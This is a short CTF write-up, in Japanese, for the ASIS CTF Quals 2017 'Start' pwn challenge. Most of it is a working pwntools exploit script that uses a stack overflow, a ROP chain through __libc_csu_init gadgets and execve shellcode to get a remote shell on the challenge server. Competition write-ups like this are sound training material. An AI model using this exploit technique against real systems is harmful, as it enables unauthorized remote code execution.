---
layout: post
redirect_from:
  - /blog/2017/04/10/asis-ctf-quals-2017-start/
date: "2017-04-10T02:45:26+09:00"
tags: [ "ctf", "writeup", "asis-ctf", "pwn" ]
"target_url": [ "https://asis-ctf.ir/challenges/" ]
---

# ASIS CTF Quals 2017: Start

## problem

`read(0, stack, 0x400);`するだけのバイナリ。NX disabled。

## solution

ROPして適当な静的領域に再度`read`し、shellcodeを置いて踏むだけ。

## implementation

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='139.59.114.220')
parser.add_argument('port', nargs='?', default=10001, type=int)
parser.add_argument('--log-level', default='debug')
parser.add_argument('--binary', default='Start')
args = parser.parse_args()
context.log_level = args.log_level
context.binary = args.binary

elf = ELF(args.binary)
static = 0x601000
libc_csu_init_a = 0x4005a0
libc_csu_init_b = 0x4005ba

p = remote(args.host, args.port)
# p = process(args.binary)

payload = ''
payload += 'A' * 16
payload += 'A' * 8 # rbp
payload += p64(libc_csu_init_b)
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(elf.got['read']) # r12 -> rip
payload += p64(1024) # r13 -> rdx
payload += p64(static + 0x900) # r14 -> rsi
payload += p64(0) # r15 -> edi
payload += p64(libc_csu_init_a)
payload += 'A' * 8 # add 8
payload += 'A' * 8 # rbx
payload += 'A' * 8 # rbp
payload += 'A' * 8 # r12
payload += 'A' * 8 # r13
payload += 'A' * 8 # r14
payload += 'A' * 8 # r15
payload += p64(static + 0x900)
p.send(payload)

time.sleep(1)

# http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
p.send(shellcode)

time.sleep(1)

p.sendline('id')
p.interactive()
```
